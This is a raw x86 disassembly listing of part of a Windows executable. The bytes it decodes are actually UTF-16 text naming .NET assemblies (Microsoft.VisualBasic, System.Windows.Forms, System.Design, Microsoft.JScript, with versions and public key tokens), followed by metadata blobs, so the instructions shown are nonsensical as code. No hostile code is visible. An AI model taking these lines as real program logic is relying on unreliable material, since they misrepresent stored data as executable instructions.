  40af2b:	add    BYTE PTR [eax],ah
  40af2d:	add    BYTE PTR [eax+0x0],dl
  40af30:	jne    0x40af32
  40af32:	bound  eax,QWORD PTR [eax]
  40af34:	ins    BYTE PTR es:[edi],dx
  40af35:	add    BYTE PTR [ecx+0x0],ch
  40af38:	arpl   WORD PTR [eax],ax
  40af3a:	dec    ebx
  40af3b:	add    BYTE PTR [ebp+0x0],ah
  40af3e:	jns    0x40af40
  40af40:	push   esp
  40af41:	add    BYTE PTR [edi+0x0],ch
  40af44:	imul   eax,DWORD PTR [eax],0x65
  40af47:	add    BYTE PTR [esi+0x0],ch
  40af4a:	cmp    eax,0x30006200
  40af4f:	add    BYTE PTR [ebx],dh
  40af51:	add    BYTE PTR [esi+0x0],ah
  40af54:	xor    eax,0x37006600
  40af59:	add    BYTE PTR [esi+0x0],ah
  40af5c:	xor    DWORD PTR [eax],eax
  40af5e:	xor    DWORD PTR [eax],eax
  40af60:	add    BYTE PTR fs:0x61003000,dh
  40af67:	add    BYTE PTR [ebx],dh
  40af69:	add    BYTE PTR [ecx+0x0],ah
  40af6c:	or     dh,0x4d
  40af6f:	add    BYTE PTR [ecx+0x0],ch
  40af72:	arpl   WORD PTR [eax],ax
  40af74:	jb     0x40af76
  40af76:	outs   dx,DWORD PTR ds:[esi]
  40af77:	add    BYTE PTR [ebx+0x0],dh
  40af7a:	outs   dx,DWORD PTR ds:[esi]
  40af7b:	add    BYTE PTR [esi+0x0],ah
  40af7e:	je     0x40af80
  40af80:	add    BYTE PTR cs:[esi+0x0],dl
  40af84:	imul   eax,DWORD PTR [eax],0x750073
  40af8a:	popa   
  40af8b:	add    BYTE PTR [eax+eax*1+0x53],ch
  40af8f:	add    BYTE PTR [eax+eax*1+0x75],dh
  40af93:	add    BYTE PTR [eax+eax*1+0x69],ah
  40af97:	add    BYTE PTR [edi+0x0],ch
  40af9a:	add    BYTE PTR cs:[edi+0x0],dl
  40af9e:	imul   eax,DWORD PTR [eax],0x64006e
  40afa4:	outs   dx,DWORD PTR ds:[esi]
  40afa5:	add    BYTE PTR [edi+0x0],dh
  40afa8:	jae    0x40afaa
  40afaa:	add    BYTE PTR cs:[esi+0x0],al
  40afae:	outs   dx,DWORD PTR ds:[esi]
  40afaf:	add    BYTE PTR [edx+0x0],dh
  40afb2:	ins    DWORD PTR es:[edi],dx
  40afb3:	add    BYTE PTR [ebx+0x0],dh
  40afb6:	sub    al,0x0
  40afb8:	and    BYTE PTR [eax],al
  40afba:	push   esi
  40afbb:	add    BYTE PTR [ebp+0x0],ah
  40afbe:	jb     0x40afc0
  40afc0:	jae    0x40afc2
  40afc2:	imul   eax,DWORD PTR [eax],0x6e006f
  40afc8:	cmp    eax,0x2e003200
  40afcd:	add    BYTE PTR [eax],dh
  40afcf:	add    BYTE PTR [esi],ch
  40afd1:	add    BYTE PTR [eax],dh
  40afd3:	add    BYTE PTR [esi],ch
  40afd5:	add    BYTE PTR [eax],dh
  40afd7:	add    BYTE PTR [eax+eax*1],ch
  40afda:	and    BYTE PTR [eax],al
  40afdc:	inc    ebx
  40afdd:	add    BYTE PTR [ebp+0x0],dh
  40afe0:	ins    BYTE PTR es:[edi],dx
  40afe1:	add    BYTE PTR [eax+eax*1+0x75],dh
  40afe5:	add    BYTE PTR [edx+0x0],dh
  40afe8:	add    BYTE PTR gs:0x65006e00,bh
  40afef:	add    BYTE PTR [ebp+0x0],dh
  40aff2:	je     0x40aff4
  40aff4:	jb     0x40aff6
  40aff6:	popa   
  40aff7:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40affb:	add    BYTE PTR [eax],ah
  40affd:	add    BYTE PTR [eax+0x0],dl
  40b000:	jne    0x40b002
  40b002:	bound  eax,QWORD PTR [eax]
  40b004:	ins    BYTE PTR es:[edi],dx
  40b005:	add    BYTE PTR [ecx+0x0],ch
  40b008:	arpl   WORD PTR [eax],ax
  40b00a:	dec    ebx
  40b00b:	add    BYTE PTR [ebp+0x0],ah
  40b00e:	jns    0x40b010
  40b010:	push   esp
  40b011:	add    BYTE PTR [edi+0x0],ch
  40b014:	imul   eax,DWORD PTR [eax],0x65
  40b017:	add    BYTE PTR [esi+0x0],ch
  40b01a:	cmp    eax,0x30006200
  40b01f:	add    BYTE PTR [ebx],dh
  40b021:	add    BYTE PTR [esi+0x0],ah
  40b024:	xor    eax,0x37006600
  40b029:	add    BYTE PTR [esi+0x0],ah
  40b02c:	xor    DWORD PTR [eax],eax
  40b02e:	xor    DWORD PTR [eax],eax
  40b030:	add    BYTE PTR fs:0x61003000,dh
  40b037:	add    BYTE PTR [ebx],dh
  40b039:	add    BYTE PTR [ecx+0x0],ah
  40b03c:	sub    BYTE PTR [esi+edx*2+0x53004a00],0x0
  40b044:	push   0x72006100
  40b049:	add    BYTE PTR [eax+0x0],dh
  40b04c:	inc    ebx
  40b04d:	add    BYTE PTR [edi+0x0],ch
  40b050:	add    BYTE PTR fs:[ebp+0x0],ah
  40b054:	push   eax
  40b055:	add    BYTE PTR [edx+0x0],dh
  40b058:	outs   dx,DWORD PTR ds:[esi]
  40b059:	add    BYTE PTR [esi+0x0],dh
  40b05c:	imul   eax,DWORD PTR [eax],0x650064
  40b062:	jb     0x40b064
  40b064:	sub    al,0x0
  40b066:	and    BYTE PTR [eax],al
  40b068:	push   esi
  40b069:	add    BYTE PTR [ebp+0x0],ah
  40b06c:	jb     0x40b06e
  40b06e:	jae    0x40b070
  40b070:	imul   eax,DWORD PTR [eax],0x6e006f
  40b076:	cmp    eax,0x2e003200
  40b07b:	add    BYTE PTR [eax],dh
  40b07d:	add    BYTE PTR [esi],ch
  40b07f:	add    BYTE PTR [eax],dh
  40b081:	add    BYTE PTR [esi],ch
  40b083:	add    BYTE PTR [eax],dh
  40b085:	add    BYTE PTR [eax+eax*1],ch
  40b088:	and    BYTE PTR [eax],al
  40b08a:	inc    ebx
  40b08b:	add    BYTE PTR [ebp+0x0],dh
  40b08e:	ins    BYTE PTR es:[edi],dx
  40b08f:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b093:	add    BYTE PTR [edx+0x0],dh
  40b096:	add    BYTE PTR gs:0x65006e00,bh
  40b09d:	add    BYTE PTR [ebp+0x0],dh
  40b0a0:	je     0x40b0a2
  40b0a2:	jb     0x40b0a4
  40b0a4:	popa   
  40b0a5:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40b0a9:	add    BYTE PTR [eax],ah
  40b0ab:	add    BYTE PTR [eax+0x0],dl
  40b0ae:	jne    0x40b0b0
  40b0b0:	bound  eax,QWORD PTR [eax]
  40b0b2:	ins    BYTE PTR es:[edi],dx
  40b0b3:	add    BYTE PTR [ecx+0x0],ch
  40b0b6:	arpl   WORD PTR [eax],ax
  40b0b8:	dec    ebx
  40b0b9:	add    BYTE PTR [ebp+0x0],ah
  40b0bc:	jns    0x40b0be
  40b0be:	push   esp
  40b0bf:	add    BYTE PTR [edi+0x0],ch
  40b0c2:	imul   eax,DWORD PTR [eax],0x65
  40b0c5:	add    BYTE PTR [esi+0x0],ch
  40b0c8:	cmp    eax,0x30006200
  40b0cd:	add    BYTE PTR [ebx],dh
  40b0cf:	add    BYTE PTR [esi+0x0],ah
  40b0d2:	xor    eax,0x37006600
  40b0d7:	add    BYTE PTR [esi+0x0],ah
  40b0da:	xor    DWORD PTR [eax],eax
  40b0dc:	xor    DWORD PTR [eax],eax
  40b0de:	add    BYTE PTR fs:0x61003000,dh
  40b0e5:	add    BYTE PTR [ebx],dh
  40b0e7:	add    BYTE PTR [ecx+0x0],ah
  40b0ea:	and    BYTE PTR [edx+0x0],ah
  40b0ed:	aaa    
  40b0ee:	add    BYTE PTR [edx+0x0],ah
  40b0f1:	add    BYTE PTR fs:[edi],dh
  40b0f4:	add    BYTE PTR [esi],dh
  40b0f6:	add    BYTE PTR [edi],dh
  40b0f8:	add    BYTE PTR [eax],bh
  40b0fa:	add    BYTE PTR [edx+0x0],ah
  40b0fd:	cmp    DWORD PTR [eax],eax
  40b0ff:	aaa    
  40b100:	add    BYTE PTR [edi],dh
  40b102:	add    BYTE PTR [edx+0x0],ah
  40b105:	add    BYTE PTR fs:[eax],bh
  40b108:	add    BYTE PTR [esi+0x0],ah
  40b10b:	xor    BYTE PTR [edx+0x530041],0x50
  40b112:	add    BYTE PTR [esi],ch
  40b114:	add    BYTE PTR [edx+0x0],al
  40b117:	jb     0x40b119
  40b119:	outs   dx,DWORD PTR ds:[esi]
  40b11a:	add    BYTE PTR [edi+0x0],dh
  40b11d:	jae    0x40b11f
  40b11f:	add    BYTE PTR gs:[edx+0x0],dh
  40b123:	inc    ebx
  40b124:	add    BYTE PTR [ecx+0x0],ah
  40b127:	jo     0x40b129
  40b129:	jae    0x40b12b
  40b12b:	inc    esi
  40b12c:	add    BYTE PTR [ecx+0x0],ah
  40b12f:	arpl   WORD PTR [eax],ax
  40b131:	je     0x40b133
  40b133:	outs   dx,DWORD PTR ds:[esi]
  40b134:	add    BYTE PTR [edx+0x0],dh
  40b137:	jns    0x40b139
  40b139:	sub    al,0x0
  40b13b:	and    BYTE PTR [eax],al
  40b13d:	push   esi
  40b13e:	add    BYTE PTR [ebp+0x0],ah
  40b141:	jb     0x40b143
  40b143:	jae    0x40b145
  40b145:	imul   eax,DWORD PTR [eax],0x6e006f
  40b14b:	cmp    eax,0x2e003200
  40b150:	add    BYTE PTR [eax],dh
  40b152:	add    BYTE PTR [esi],ch
  40b154:	add    BYTE PTR [eax],dh
  40b156:	add    BYTE PTR [esi],ch
  40b158:	add    BYTE PTR [eax],dh
  40b15a:	add    BYTE PTR [eax+eax*1],ch
  40b15d:	and    BYTE PTR [eax],al
  40b15f:	inc    ebx
  40b160:	add    BYTE PTR [ebp+0x0],dh
  40b163:	ins    BYTE PTR es:[edi],dx
  40b164:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b168:	add    BYTE PTR [edx+0x0],dh
  40b16b:	add    BYTE PTR gs:0x65006e00,bh
  40b172:	add    BYTE PTR [ebp+0x0],dh
  40b175:	je     0x40b177
  40b177:	jb     0x40b179
  40b179:	popa   
  40b17a:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40b17e:	add    BYTE PTR [eax],ah
  40b180:	add    BYTE PTR [eax+0x0],dl
  40b183:	jne    0x40b185
  40b185:	bound  eax,QWORD PTR [eax]
  40b187:	ins    BYTE PTR es:[edi],dx
  40b188:	add    BYTE PTR [ecx+0x0],ch
  40b18b:	arpl   WORD PTR [eax],ax
  40b18d:	dec    ebx
  40b18e:	add    BYTE PTR [ebp+0x0],ah
  40b191:	jns    0x40b193
  40b193:	push   esp
  40b194:	add    BYTE PTR [edi+0x0],ch
  40b197:	imul   eax,DWORD PTR [eax],0x65
  40b19a:	add    BYTE PTR [esi+0x0],ch
  40b19d:	cmp    eax,0x37006200
  40b1a2:	add    BYTE PTR [edx+0x0],ah
  40b1a5:	add    BYTE PTR fs:[edi],dh
  40b1a8:	add    BYTE PTR [esi],dh
  40b1aa:	add    BYTE PTR [edi],dh
  40b1ac:	add    BYTE PTR [eax],bh
  40b1ae:	add    BYTE PTR [edx+0x0],ah
  40b1b1:	cmp    DWORD PTR [eax],eax
  40b1b3:	aaa    
  40b1b4:	add    BYTE PTR [edi],dh
  40b1b6:	add    BYTE PTR [edx+0x0],ah
  40b1b9:	add    BYTE PTR fs:[eax],bh
  40b1bc:	add    BYTE PTR [esi+0x0],ah
  40b1bf:	sub    BYTE PTR [esi+0x69004d],0x63
  40b1c6:	add    BYTE PTR [edx+0x0],dh
  40b1c9:	outs   dx,DWORD PTR ds:[esi]
  40b1ca:	add    BYTE PTR [ebx+0x0],dh
  40b1cd:	outs   dx,DWORD PTR ds:[esi]
  40b1ce:	add    BYTE PTR [esi+0x0],ah
  40b1d1:	je     0x40b1d3
  40b1d3:	add    BYTE PTR cs:[esi+0x0],dl
  40b1d7:	push   ebx
  40b1d8:	add    BYTE PTR [eax+eax*1+0x65],al
  40b1dc:	add    BYTE PTR [ebx+0x0],dh
  40b1df:	imul   eax,DWORD PTR [eax],0x6e0067
  40b1e5:	add    BYTE PTR gs:[edx+0x0],dh
  40b1e9:	sub    al,0x0
  40b1eb:	and    BYTE PTR [eax],al
  40b1ed:	push   esi
  40b1ee:	add    BYTE PTR [ebp+0x0],ah
  40b1f1:	jb     0x40b1f3
  40b1f3:	jae    0x40b1f5
  40b1f5:	imul   eax,DWORD PTR [eax],0x6e006f
  40b1fb:	cmp    eax,0x2e003900
  40b200:	add    BYTE PTR [eax],dh
  40b202:	add    BYTE PTR [esi],ch
  40b204:	add    BYTE PTR [eax],dh
  40b206:	add    BYTE PTR [esi],ch
  40b208:	add    BYTE PTR [eax],dh
  40b20a:	add    BYTE PTR [eax+eax*1],ch
  40b20d:	and    BYTE PTR [eax],al
  40b20f:	inc    ebx
  40b210:	add    BYTE PTR [ebp+0x0],dh
  40b213:	ins    BYTE PTR es:[edi],dx
  40b214:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b218:	add    BYTE PTR [edx+0x0],dh
  40b21b:	add    BYTE PTR gs:0x65006e00,bh
  40b222:	add    BYTE PTR [ebp+0x0],dh
  40b225:	je     0x40b227
  40b227:	jb     0x40b229
  40b229:	popa   
  40b22a:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40b22e:	add    BYTE PTR [eax],ah
  40b230:	add    BYTE PTR [eax+0x0],dl
  40b233:	jne    0x40b235
  40b235:	bound  eax,QWORD PTR [eax]
  40b237:	ins    BYTE PTR es:[edi],dx
  40b238:	add    BYTE PTR [ecx+0x0],ch
  40b23b:	arpl   WORD PTR [eax],ax
  40b23d:	dec    ebx
  40b23e:	add    BYTE PTR [ebp+0x0],ah
  40b241:	jns    0x40b243
  40b243:	push   esp
  40b244:	add    BYTE PTR [edi+0x0],ch
  40b247:	imul   eax,DWORD PTR [eax],0x65
  40b24a:	add    BYTE PTR [esi+0x0],ch
  40b24d:	cmp    eax,0x30006200
  40b252:	add    BYTE PTR [ebx],dh
  40b254:	add    BYTE PTR [esi+0x0],ah
  40b257:	xor    eax,0x37006600
  40b25c:	add    BYTE PTR [esi+0x0],ah
  40b25f:	xor    DWORD PTR [eax],eax
  40b261:	xor    DWORD PTR [eax],eax
  40b263:	add    BYTE PTR fs:0x61003000,dh
  40b26a:	add    BYTE PTR [ebx],dh
  40b26c:	add    BYTE PTR [ecx+0x0],ah
  40b26f:	cmp    BYTE PTR [edx+0x69004d],0x63
  40b276:	add    BYTE PTR [edx+0x0],dh
  40b279:	outs   dx,DWORD PTR ds:[esi]
  40b27a:	add    BYTE PTR [ebx+0x0],dh
  40b27d:	outs   dx,DWORD PTR ds:[esi]
  40b27e:	add    BYTE PTR [esi+0x0],ah
  40b281:	je     0x40b283
  40b283:	add    BYTE PTR cs:[esi+0x0],dl
  40b287:	imul   eax,DWORD PTR [eax],0x750073
  40b28d:	popa   
  40b28e:	add    BYTE PTR [eax+eax*1+0x53],ch
  40b292:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b296:	add    BYTE PTR [eax+eax*1+0x69],ah
  40b29a:	add    BYTE PTR [edi+0x0],ch
  40b29d:	add    BYTE PTR cs:[edi+0x0],dl
  40b2a1:	add    BYTE PTR gs:[edx+0x0],ah
  40b2a5:	sub    al,0x0
  40b2a7:	and    BYTE PTR [eax],al
  40b2a9:	push   esi
  40b2aa:	add    BYTE PTR [ebp+0x0],ah
  40b2ad:	jb     0x40b2af
  40b2af:	jae    0x40b2b1
  40b2b1:	imul   eax,DWORD PTR [eax],0x6e006f
  40b2b7:	cmp    eax,0x2e003900
  40b2bc:	add    BYTE PTR [eax],dh
  40b2be:	add    BYTE PTR [esi],ch
  40b2c0:	add    BYTE PTR [eax],dh
  40b2c2:	add    BYTE PTR [esi],ch
  40b2c4:	add    BYTE PTR [eax],dh
  40b2c6:	add    BYTE PTR [eax+eax*1],ch
  40b2c9:	and    BYTE PTR [eax],al
  40b2cb:	inc    ebx
  40b2cc:	add    BYTE PTR [ebp+0x0],dh
  40b2cf:	ins    BYTE PTR es:[edi],dx
  40b2d0:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b2d4:	add    BYTE PTR [edx+0x0],dh
  40b2d7:	add    BYTE PTR gs:0x65006e00,bh
  40b2de:	add    BYTE PTR [ebp+0x0],dh
  40b2e1:	je     0x40b2e3
  40b2e3:	jb     0x40b2e5
  40b2e5:	popa   
  40b2e6:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40b2ea:	add    BYTE PTR [eax],ah
  40b2ec:	add    BYTE PTR [eax+0x0],dl
  40b2ef:	jne    0x40b2f1
  40b2f1:	bound  eax,QWORD PTR [eax]
  40b2f3:	ins    BYTE PTR es:[edi],dx
  40b2f4:	add    BYTE PTR [ecx+0x0],ch
  40b2f7:	arpl   WORD PTR [eax],ax
  40b2f9:	dec    ebx
  40b2fa:	add    BYTE PTR [ebp+0x0],ah
  40b2fd:	jns    0x40b2ff
  40b2ff:	push   esp
  40b300:	add    BYTE PTR [edi+0x0],ch
  40b303:	imul   eax,DWORD PTR [eax],0x65
  40b306:	add    BYTE PTR [esi+0x0],ch
  40b309:	cmp    eax,0x30006200
  40b30e:	add    BYTE PTR [ebx],dh
  40b310:	add    BYTE PTR [esi+0x0],ah
  40b313:	xor    eax,0x37006600
  40b318:	add    BYTE PTR [esi+0x0],ah
  40b31b:	xor    DWORD PTR [eax],eax
  40b31d:	xor    DWORD PTR [eax],eax
  40b31f:	add    BYTE PTR fs:0x61003000,dh
  40b326:	add    BYTE PTR [ebx],dh
  40b328:	add    BYTE PTR [ecx+0x0],ah
  40b32b:	cmp    BYTE PTR [ebp+ecx*2+0x63006900],0x0
  40b333:	jb     0x40b335
  40b335:	outs   dx,DWORD PTR ds:[esi]
  40b336:	add    BYTE PTR [ebx+0x0],dh
  40b339:	outs   dx,DWORD PTR ds:[esi]
  40b33a:	add    BYTE PTR [esi+0x0],ah
  40b33d:	je     0x40b33f
  40b33f:	add    BYTE PTR cs:[edi+0x0],dl
  40b343:	add    BYTE PTR gs:[edx+0x0],ah
  40b347:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  40b34c:	add    BYTE PTR [ebx+0x0],dh
  40b34f:	imul   eax,DWORD PTR [eax],0x6e0067
  40b355:	add    BYTE PTR cs:[ebx+0x0],al
  40b359:	ins    BYTE PTR es:[edi],dx
  40b35a:	add    BYTE PTR [ecx+0x0],ch
  40b35d:	add    BYTE PTR gs:[esi+0x0],ch
  40b361:	je     0x40b363
  40b363:	sub    al,0x0
  40b365:	and    BYTE PTR [eax],al
  40b367:	push   esi
  40b368:	add    BYTE PTR [ebp+0x0],ah
  40b36b:	jb     0x40b36d
  40b36d:	jae    0x40b36f
  40b36f:	imul   eax,DWORD PTR [eax],0x6e006f
  40b375:	cmp    eax,0x2e003900
  40b37a:	add    BYTE PTR [eax],dh
  40b37c:	add    BYTE PTR [esi],ch
  40b37e:	add    BYTE PTR [eax],dh
  40b380:	add    BYTE PTR [esi],ch
  40b382:	add    BYTE PTR [eax],dh
  40b384:	add    BYTE PTR [eax+eax*1],ch
  40b387:	and    BYTE PTR [eax],al
  40b389:	inc    ebx
  40b38a:	add    BYTE PTR [ebp+0x0],dh
  40b38d:	ins    BYTE PTR es:[edi],dx
  40b38e:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b392:	add    BYTE PTR [edx+0x0],dh
  40b395:	add    BYTE PTR gs:0x65006e00,bh
  40b39c:	add    BYTE PTR [ebp+0x0],dh
  40b39f:	je     0x40b3a1
  40b3a1:	jb     0x40b3a3
  40b3a3:	popa   
  40b3a4:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40b3a8:	add    BYTE PTR [eax],ah
  40b3aa:	add    BYTE PTR [eax+0x0],dl
  40b3ad:	jne    0x40b3af
  40b3af:	bound  eax,QWORD PTR [eax]
  40b3b1:	ins    BYTE PTR es:[edi],dx
  40b3b2:	add    BYTE PTR [ecx+0x0],ch
  40b3b5:	arpl   WORD PTR [eax],ax
  40b3b7:	dec    ebx
  40b3b8:	add    BYTE PTR [ebp+0x0],ah
  40b3bb:	jns    0x40b3bd
  40b3bd:	push   esp
  40b3be:	add    BYTE PTR [edi+0x0],ch
  40b3c1:	imul   eax,DWORD PTR [eax],0x65
  40b3c4:	add    BYTE PTR [esi+0x0],ch
  40b3c7:	cmp    eax,0x30006200
  40b3cc:	add    BYTE PTR [ebx],dh
  40b3ce:	add    BYTE PTR [esi+0x0],ah
  40b3d1:	xor    eax,0x37006600
  40b3d6:	add    BYTE PTR [esi+0x0],ah
  40b3d9:	xor    DWORD PTR [eax],eax
  40b3db:	xor    DWORD PTR [eax],eax
  40b3dd:	add    BYTE PTR fs:0x61003000,dh
  40b3e4:	add    BYTE PTR [ebx],dh
  40b3e6:	add    BYTE PTR [ecx+0x0],ah
  40b3e9:	cmp    BYTE PTR [ebp+ecx*2+0x63006900],0x0
  40b3f1:	jb     0x40b3f3
  40b3f3:	outs   dx,DWORD PTR ds:[esi]
  40b3f4:	add    BYTE PTR [ebx+0x0],dh
  40b3f7:	outs   dx,DWORD PTR ds:[esi]
  40b3f8:	add    BYTE PTR [esi+0x0],ah
  40b3fb:	je     0x40b3fd
  40b3fd:	add    BYTE PTR cs:[esi+0x0],dl
  40b401:	push   ebx
  40b402:	add    BYTE PTR [eax+eax*1+0x65],al
  40b406:	add    BYTE PTR [ebx+0x0],dh
  40b409:	imul   eax,DWORD PTR [eax],0x6e0067
  40b40f:	add    BYTE PTR gs:[edx+0x0],dh
  40b413:	add    BYTE PTR cs:[ebp+0x0],cl
  40b417:	outs   dx,DWORD PTR ds:[esi]
  40b418:	add    BYTE PTR [edx+0x0],ah
  40b41b:	imul   eax,DWORD PTR [eax],0x65006c
  40b421:	sub    al,0x0
  40b423:	and    BYTE PTR [eax],al
  40b425:	push   esi
  40b426:	add    BYTE PTR [ebp+0x0],ah
  40b429:	jb     0x40b42b
  40b42b:	jae    0x40b42d
  40b42d:	imul   eax,DWORD PTR [eax],0x6e006f
  40b433:	cmp    eax,0x2e003800
  40b438:	add    BYTE PTR [eax],dh
  40b43a:	add    BYTE PTR [esi],ch
  40b43c:	add    BYTE PTR [eax],dh
  40b43e:	add    BYTE PTR [esi],ch
  40b440:	add    BYTE PTR [eax],dh
  40b442:	add    BYTE PTR [eax+eax*1],ch
  40b445:	and    BYTE PTR [eax],al
  40b447:	inc    ebx
  40b448:	add    BYTE PTR [ebp+0x0],dh
  40b44b:	ins    BYTE PTR es:[edi],dx
  40b44c:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b450:	add    BYTE PTR [edx+0x0],dh
  40b453:	add    BYTE PTR gs:0x65006e00,bh
  40b45a:	add    BYTE PTR [ebp+0x0],dh
  40b45d:	je     0x40b45f
  40b45f:	jb     0x40b461
  40b461:	popa   
  40b462:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40b466:	add    BYTE PTR [eax],ah
  40b468:	add    BYTE PTR [eax+0x0],dl
  40b46b:	jne    0x40b46d
  40b46d:	bound  eax,QWORD PTR [eax]
  40b46f:	ins    BYTE PTR es:[edi],dx
  40b470:	add    BYTE PTR [ecx+0x0],ch
  40b473:	arpl   WORD PTR [eax],ax
  40b475:	dec    ebx
  40b476:	add    BYTE PTR [ebp+0x0],ah
  40b479:	jns    0x40b47b
  40b47b:	push   esp
  40b47c:	add    BYTE PTR [edi+0x0],ch
  40b47f:	imul   eax,DWORD PTR [eax],0x65
  40b482:	add    BYTE PTR [esi+0x0],ch
  40b485:	cmp    eax,0x30006200
  40b48a:	add    BYTE PTR [ebx],dh
  40b48c:	add    BYTE PTR [esi+0x0],ah
  40b48f:	xor    eax,0x37006600
  40b494:	add    BYTE PTR [esi+0x0],ah
  40b497:	xor    DWORD PTR [eax],eax
  40b499:	xor    DWORD PTR [eax],eax
  40b49b:	add    BYTE PTR fs:0x61003000,dh
  40b4a2:	add    BYTE PTR [ebx],dh
  40b4a4:	add    BYTE PTR [ecx+0x0],ah
  40b4a7:	sub    BYTE PTR [eax+0x69004d],0x63
  40b4ae:	add    BYTE PTR [edx+0x0],dh
  40b4b1:	outs   dx,DWORD PTR ds:[esi]
  40b4b2:	add    BYTE PTR [ebx+0x0],dh
  40b4b5:	outs   dx,DWORD PTR ds:[esi]
  40b4b6:	add    BYTE PTR [esi+0x0],ah
  40b4b9:	je     0x40b4bb
  40b4bb:	add    BYTE PTR cs:[edx+0x0],cl
  40b4bf:	push   ebx
  40b4c0:	add    BYTE PTR [ebx+0x0],ah
  40b4c3:	jb     0x40b4c5
  40b4c5:	imul   eax,DWORD PTR [eax],0x740070
  40b4cb:	sub    al,0x0
  40b4cd:	and    BYTE PTR [eax],al
  40b4cf:	push   esi
  40b4d0:	add    BYTE PTR [ebp+0x0],ah
  40b4d3:	jb     0x40b4d5
  40b4d5:	jae    0x40b4d7
  40b4d7:	imul   eax,DWORD PTR [eax],0x6e006f
  40b4dd:	cmp    eax,0x2e003800
  40b4e2:	add    BYTE PTR [eax],dh
  40b4e4:	add    BYTE PTR [esi],ch
  40b4e6:	add    BYTE PTR [eax],dh
  40b4e8:	add    BYTE PTR [esi],ch
  40b4ea:	add    BYTE PTR [eax],dh
  40b4ec:	add    BYTE PTR [eax+eax*1],ch
  40b4ef:	and    BYTE PTR [eax],al
  40b4f1:	inc    ebx
  40b4f2:	add    BYTE PTR [ebp+0x0],dh
  40b4f5:	ins    BYTE PTR es:[edi],dx
  40b4f6:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b4fa:	add    BYTE PTR [edx+0x0],dh
  40b4fd:	add    BYTE PTR gs:0x65006e00,bh
  40b504:	add    BYTE PTR [ebp+0x0],dh
  40b507:	je     0x40b509
  40b509:	jb     0x40b50b
  40b50b:	popa   
  40b50c:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40b510:	add    BYTE PTR [eax],ah
  40b512:	add    BYTE PTR [eax+0x0],dl
  40b515:	jne    0x40b517
  40b517:	bound  eax,QWORD PTR [eax]
  40b519:	ins    BYTE PTR es:[edi],dx
  40b51a:	add    BYTE PTR [ecx+0x0],ch
  40b51d:	arpl   WORD PTR [eax],ax
  40b51f:	dec    ebx
  40b520:	add    BYTE PTR [ebp+0x0],ah
  40b523:	jns    0x40b525
  40b525:	push   esp
  40b526:	add    BYTE PTR [edi+0x0],ch
  40b529:	imul   eax,DWORD PTR [eax],0x65
  40b52c:	add    BYTE PTR [esi+0x0],ch
  40b52f:	cmp    eax,0x30006200
  40b534:	add    BYTE PTR [ebx],dh
  40b536:	add    BYTE PTR [esi+0x0],ah
  40b539:	xor    eax,0x37006600
  40b53e:	add    BYTE PTR [esi+0x0],ah
  40b541:	xor    DWORD PTR [eax],eax
  40b543:	xor    DWORD PTR [eax],eax
  40b545:	add    BYTE PTR fs:0x61003000,dh
  40b54c:	add    BYTE PTR [ebx],dh
  40b54e:	add    BYTE PTR [ecx+0x0],ah
  40b551:	add    eax,DWORD PTR [esi]
  40b553:	adc    bl,BYTE PTR [ecx]
  40b555:	add    eax,DWORD PTR [eax]
  40b557:	add    BYTE PTR [ecx],al
  40b559:	add    al,0x0
  40b55b:	add    DWORD PTR [esi],ecx
  40b55d:	push   cs
  40b55e:	add    eax,0xe0e0200
  40b563:	sbb    al,0x6
  40b565:	add    BYTE PTR [ebx],al
  40b567:	push   cs
  40b568:	push   cs
  40b569:	sbb    al,0x1c
  40b56b:	pop    es
  40b56c:	add    BYTE PTR [esi+ecx*1],al
  40b56f:	push   cs
  40b570:	sbb    al,0x1c
  40b572:	sbb    al,0x8
  40b574:	add    BYTE PTR ds:0x1c1c0e0e,al
  40b57a:	sbb    al,0x1c
  40b57c:	or     DWORD PTR [eax],eax
  40b57e:	push   es
  40b57f:	push   cs
  40b580:	push   cs
  40b581:	sbb    al,0x1c
  40b583:	sbb    al,0x1c
  40b585:	sbb    al,0xa
  40b587:	add    BYTE PTR [edi],al
  40b589:	push   cs
  40b58a:	push   cs
  40b58b:	sbb    al,0x1c
  40b58d:	sbb    al,0x1c
  40b58f:	sbb    al,0x1c
  40b591:	add    esp,DWORD PTR [eax]
  40b593:	add    BYTE PTR [ecx],al
  40b595:	add    al,0x0
  40b597:	add    BYTE PTR [eax],al
  40b599:	add    BYTE PTR [esp+eiz*2],al
  40b59c:	add    BYTE PTR [eax],al
  40b59e:	add    BYTE PTR [esp+eax*1],al
  40b5a1:	add    DWORD PTR [eax],eax
  40b5a3:	add    BYTE PTR ds:0x1d080100,al
  40b5a9:	push   cs
  40b5aa:	add    eax,DWORD PTR [eax]
  40b5ac:	add    BYTE PTR [eax],cl
  40b5ae:	or     al,BYTE PTR [eax]
  40b5b0:	add    eax,DWORD PTR [edx]
  40b5b2:	sbb    eax,0x5812100e
  40b5b7:	adc    BYTE PTR [eax],cl
  40b5b9:	or     eax,DWORD PTR [eax]
  40b5bb:	push   es
  40b5bc:	or     BYTE PTR [esi],cl
  40b5be:	push   cs
  40b5bf:	push   cs
  40b5c0:	or     BYTE PTR [edx],dl
  40b5c2:	sbb    eax,0x5081d
  40b5c7:	add    al,BYTE PTR [edx]
  40b5c9:	push   cs
  40b5ca:	push   cs
  40b5cb:	add    eax,DWORD PTR [esi]
  40b5cd:	adc    bl,BYTE PTR [eax+0x5]
  40b5d0:	and    BYTE PTR [edx],al
  40b5d2:	add    DWORD PTR [esi],ecx
  40b5d4:	push   cs
  40b5d5:	add    esp,DWORD PTR [eax]
  40b5d7:	add    BYTE PTR [esi],cl
  40b5d9:	add    ebp,DWORD PTR [eax]
  40b5db:	add    BYTE PTR [esi],cl
  40b5dd:	add    eax,DWORD PTR [esi]
  40b5df:	sbb    eax,0x1d06030e
  40b5e4:	add    al,BYTE PTR ds:0x1d010120
